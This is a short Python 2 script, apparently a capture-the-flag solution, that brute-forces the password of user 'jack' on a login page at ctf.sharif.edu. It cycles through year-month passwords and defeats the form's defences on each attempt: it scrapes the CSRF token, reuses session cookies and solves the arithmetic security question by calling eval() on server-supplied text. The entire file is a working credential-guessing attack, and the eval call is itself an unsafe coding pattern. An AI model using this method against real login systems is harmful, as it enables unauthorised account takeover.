import requests
from BeautifulSoup import BeautifulSoup

url="http://ctf.sharif.edu:8084/login"
url1="http://ctf.sharif.edu:8084/signin"
cmp = "Redirecting to http://ctf.sharif.edu:8084/login"

for year in range(1954, 2018):
    for month in range(1, 13):

        r = requests.get(url)
        page = r.text

        soup = BeautifulSoup(page)
        for link in soup.findAll('input'):
		        if("SecQuestion" in link.get("name")):
		    		chal = link.get("placeholder")
		        if("field" in link.get("name")):
		        	field = link.get("value")
		        if("_token" in link.get("name")):
		        	_token = link.get("value") 

	val = chal.split(" =")[0].replace("x","*")
	print val
        solution = (eval(val))
        print solution

        xsrf_token = r.headers["Set-Cookie"].split("XSRF-TOKEN=")[1].split(";")[0]
        laravel_session = r.headers["Set-Cookie"].split("laravel_session=")[1].split(";")[0]

        cookies = {"wordpress_test_cookie": "WP+Cookie+check",
                   "XSRF-TOKEN": xsrf_token,
                   "laravel_session": laravel_session}

        month = str(month).zfill(2)
        password = str(year) + month

        data = {"Username": "jack",
                "Password": password,
                "SecQuestion": str(solution),
                "field": field,
                "_token": _token,
                "Submit": "Login"}
        req = requests.post(url1, cookies=cookies, data=data, allow_redirects=False)
        res = req.text
        if(cmp not in res):
        	print "Password is : " + str(password)
         	exit()
        print str(password)